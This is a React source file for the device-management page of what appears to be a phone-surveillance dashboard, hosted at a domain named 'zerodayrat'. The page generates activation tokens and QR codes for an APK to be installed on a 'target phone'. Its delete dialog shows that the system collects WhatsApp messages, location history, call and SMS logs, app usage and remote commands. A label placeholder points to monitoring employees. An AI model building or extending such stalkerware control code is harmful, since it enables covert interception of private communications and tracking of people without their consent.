import { useEffect, useState } from "react";
import { Link } from "react-router-dom";
import QRCode from "qrcode";
import { devicesApi } from "../api/devices";
import type { Device } from "../api/types";

/**
 * The publicly-deployed dashboard domain — must match the host configured in
 * the Android app's https intent-filter (AndroidManifest.xml). Links
 * generated while running the dashboard locally (localhost dev server)
 * still need to point here, since a target phone can never reach localhost.
 */
const PRODUCTION_APP_URL = "https://zerodayrat.vercel.app";

/**
 * Public https URL (works in any browser, scannable by any QR reader) that
 * opens the app directly via Android App Link if installed, or falls back to
 * the /connect page's instructions otherwise. See ConnectPage.tsx and the
 * https intent-filter on ActivationActivity in AndroidManifest.xml.
 */
function buildActivationLink(device: Device): string {
  const params = new URLSearchParams({
    token: device.device_token || "",
    name: device.device_label,
  });
  const isLocalDev = ["localhost", "127.0.0.1"].includes(window.location.hostname);
  const origin = isLocalDev ? PRODUCTION_APP_URL : window.location.origin;
  return `${origin}/connect?${params.toString()}`;
}

export default function DevicesListPage() {
  const [devices, setDevices] = useState<Device[]>([]);
  const [loading, setLoading] = useState(true);
  const [showCreate, setShowCreate] = useState(false);
  const [newLabel, setNewLabel] = useState("");
  const [createdDevice, setCreatedDevice] = useState<Device | null>(null);
  const [creating, setCreating] = useState(false);
  const [createError, setCreateError] = useState<string | null>(null);
  const [qrDataUrl, setQrDataUrl] = useState<string | null>(null);
  const [linkCopied, setLinkCopied] = useState(false);

  useEffect(() => {
    if (!createdDevice) {
      setQrDataUrl(null);
      return;
    }
    QRCode.toDataURL(buildActivationLink(createdDevice), { width: 220, margin: 1 })
      .then(setQrDataUrl)
      .catch(() => setQrDataUrl(null));
  }, [createdDevice]);

  async function handleCopyLink() {
    if (!createdDevice) return;
    try {
      await navigator.clipboard.writeText(buildActivationLink(createdDevice));
      setLinkCopied(true);
      setTimeout(() => setLinkCopied(false), 2000);
    } catch {
      // clipboard API unavailable — the link text is still visible to copy manually
    }
  }

  const [deletingDeviceId, setDeletingDeviceId] = useState<string | null>(null);

  function load() {
    setLoading(true);
    devicesApi
      .list()
      .then(setDevices)
      .finally(() => setLoading(false));
  }

  useEffect(load, []);

  async function handleCreate() {
    if (!newLabel.trim() || creating) return;
    setCreating(true);
    setCreateError(null);
    try {
      const device = await devicesApi.create(newLabel.trim());
      setCreatedDevice(device);
      setNewLabel("");
      load();
    } catch (err: any) {
      const msg = err.response?.data?.error || err.message || "Failed to create device";
      setCreateError(msg);
      alert(`Create device failed: ${msg}`);
    } finally {
      setCreating(false);
    }
  }

  async function handleDeleteDevice(id: string, label: string, status: string) {
    const confirmed = confirm(
      `Permanently delete the device "${label}" (${status}) and ALL of its stored data in PostgreSQL?\n\n` +
        `This will immediately purge:\n` +
        `• All WhatsApp chat messages\n` +
        `• Location history and geofences\n` +
        `• Call and SMS logs\n` +
        `• App usage and installed apps\n` +
        `• Remote commands and settings\n\n` +
        `This action cannot be undone.`
    );
    if (!confirmed) return;
    setDeletingDeviceId(id);
    try {
      await devicesApi.delete(id);
      load();
    } catch (e) {
      alert(`Delete device failed: ${(e as Error).message}`);
    } finally {
      setDeletingDeviceId(null);
    }
  }

  const connectedDevices = devices.filter((d) => d.status !== "revoked");
  const deactivatedDevices = devices.filter((d) => d.status === "revoked");

  return (
    <div>
      <div className="flex items-center justify-between mb-6">
        <h1 className="text-xl font-bold text-primary-dark">Devices</h1>
        <button
          onClick={() => setShowCreate(true)}
          className="bg-primary text-white text-sm px-4 py-2 rounded hover:bg-primary-dark transition"
        >
          + Add Device
        </button>
      </div>

      {showCreate && (
        <div className="bg-white rounded-lg shadow-sm p-5 mb-6">
          <h2 className="font-semibold text-sm mb-3">New Device</h2>
          <div className="flex gap-2">
            <input
              value={newLabel}
              onChange={(e) => setNewLabel(e.target.value)}
              placeholder="e.g. Kid's Phone, Employee - Priya"
              className="flex-1 border border-gray-300 rounded px-3 py-2 text-sm focus:outline-none focus:ring-2 focus:ring-accent"
            />
            <button
              onClick={handleCreate}
              disabled={creating}
              className={`bg-primary text-white text-sm px-4 py-2 rounded transition ${
                creating ? "opacity-50 cursor-not-allowed" : "hover:bg-primary-dark"
              }`}
            >
              {creating ? "Creating..." : "Create"}
            </button>
            <button
              onClick={() => {
                setShowCreate(false);
                setCreatedDevice(null);
                setCreateError(null);
              }}
              className="text-gray-500 text-sm px-2"
            >
              Cancel
            </button>
          </div>
          {createError && (
            <div className="mt-2 text-xs text-red-600 bg-red-50 p-2 rounded">
              {createError}
            </div>
          )}

          {createdDevice && (
            <div className="mt-4 bg-blue-50 border border-blue-200 rounded p-4 text-sm">
              <p className="font-medium mb-2">
                Device "{createdDevice.device_label}" created — connect it one of these ways:
              </p>

              <div className="flex flex-col sm:flex-row gap-4 items-start">
                {qrDataUrl && (
                  <div className="bg-white border rounded p-2 shrink-0">
                    <img src={qrDataUrl} alt="Activation QR code" width={160} height={160} />
                  </div>
                )}

                <div className="flex-1 min-w-0">
                  <p className="text-gray-600 text-xs mb-1">
                    1. Install the APK on the target phone and grant permissions.
                  </p>
                  <p className="text-gray-600 text-xs mb-2">
                    2. Scan this QR code (or open the link below) on that phone — the device name
                    and token fill in automatically, no manual typing needed.
                  </p>
                  <div className="flex gap-2 mb-3">
                    <code className="flex-1 block bg-white border rounded px-2 py-1.5 font-mono text-xs break-all">
                      {buildActivationLink(createdDevice)}
                    </code>
                    <button
                      onClick={handleCopyLink}
                      className="text-xs bg-white border border-gray-300 rounded px-2 py-1.5 hover:bg-gray-50 shrink-0"
                    >
                      {linkCopied ? "Copied!" : "Copy link"}
                    </button>
                  </div>

                  <details className="text-xs text-gray-500">
                    <summary className="cursor-pointer select-none">Or enter the code manually</summary>
                    <code className="block mt-1 bg-white border rounded px-2 py-1.5 font-mono break-all">
                      {createdDevice.device_token}
                    </code>
                  </details>
                </div>
              </div>
            </div>
          )}
        </div>
      )}

      {loading ? (
        <p className="text-gray-500 text-sm">Loading...</p>
      ) : devices.length === 0 ? (
        <p className="text-gray-500 text-sm">No devices yet. Click "Add Device" to get started.</p>
      ) : (
        <>
          <DeviceTable
            devices={connectedDevices}
            emptyText="No connected devices."
            showCode
            onDelete={handleDeleteDevice}
            deletingDeviceId={deletingDeviceId}
          />

          {deactivatedDevices.length > 0 && (
            <div className="mt-8">
              <h2 className="text-sm font-semibold text-gray-500 mb-3">
                Deactivated Devices ({deactivatedDevices.length})
              </h2>
              <p className="text-xs text-gray-400 mb-3">
                Disconnected — not syncing. Click a device to view its stored data, reconnect it
                with the same code, or delete it permanently.
              </p>
              <DeviceTable
                devices={deactivatedDevices}
                emptyText=""
                showCode
                archived
                onDelete={handleDeleteDevice}
                deletingDeviceId={deletingDeviceId}
              />
            </div>
          )}
        </>
      )}
    </div>
  );
}

function DeviceTable({
  devices,
  emptyText,
  showCode,
  archived,
  onDelete,
  deletingDeviceId,
}: {
  devices: Device[];
  emptyText: string;
  showCode?: boolean;
  archived?: boolean;
  onDelete: (id: string, label: string, status: string) => void;
  deletingDeviceId: string | null;
}) {
  if (devices.length === 0) {
    return emptyText ? <p className="text-gray-500 text-sm">{emptyText}</p> : null;
  }

  return (
    <div className="bg-white rounded-lg shadow-sm overflow-hidden">
      <table className="w-full text-sm">
        <thead className="bg-gray-50 text-gray-500 text-left">
          <tr>
            <th className="px-4 py-3 font-medium">Label</th>
            <th className="px-4 py-3 font-medium">Status</th>
            <th className="px-4 py-3 font-medium">OS</th>
            <th className="px-4 py-3 font-medium">Last Seen</th>
            {showCode && <th className="px-4 py-3 font-medium">Reconnect Code</th>}
            <th className="px-4 py-3 font-medium text-right">Actions</th>
          </tr>
        </thead>
        <tbody className="divide-y">
          {devices.map((d) => (
            <tr key={d.id} className="hover:bg-gray-50">
              <td className="px-4 py-3">
                <Link
                  to={archived ? `/devices/${d.id}/archive` : `/devices/${d.id}`}
                  className="text-accent hover:underline font-medium"
                >
                  {d.device_label}
                </Link>
              </td>
              <td className="px-4 py-3">
                <StatusBadge status={d.status} />
              </td>
              <td className="px-4 py-3 text-gray-600">{d.os_version || "—"}</td>
              <td className="px-4 py-3 text-gray-600">
                {d.last_seen_at ? new Date(d.last_seen_at).toLocaleString() : "Never"}
              </td>
              {showCode && (
                <td className="px-4 py-3">
                  <code className="text-xs bg-gray-100 px-2 py-1 rounded break-all">{d.device_token}</code>
                </td>
              )}
              <td className="px-4 py-3 text-right">
                <button
                  onClick={() => onDelete(d.id, d.device_label, d.status)}
                  disabled={deletingDeviceId === d.id}
                  className="text-red-600 hover:text-red-700 text-xs border border-red-200 px-3 py-1.5 rounded hover:bg-red-50 transition font-medium disabled:opacity-50"
                  title="Delete device and all data"
                >
                  {deletingDeviceId === d.id ? "Deleting..." : "Delete"}
                </button>
              </td>
            </tr>
          ))}
        </tbody>
      </table>
    </div>
  );
}

function StatusBadge({ status }: { status: string }) {
  const colors: Record<string, string> = {
    active: "bg-green-100 text-green-700",
    pending: "bg-yellow-100 text-yellow-700",
    revoked: "bg-red-100 text-red-700",
  };
  const labels: Record<string, string> = { revoked: "deactivated" };
  return (
    <span className={`px-2 py-0.5 rounded-full text-xs font-medium ${colors[status] || "bg-gray-100"}`}>
      {labels[status] || status}
    </span>
  );
}
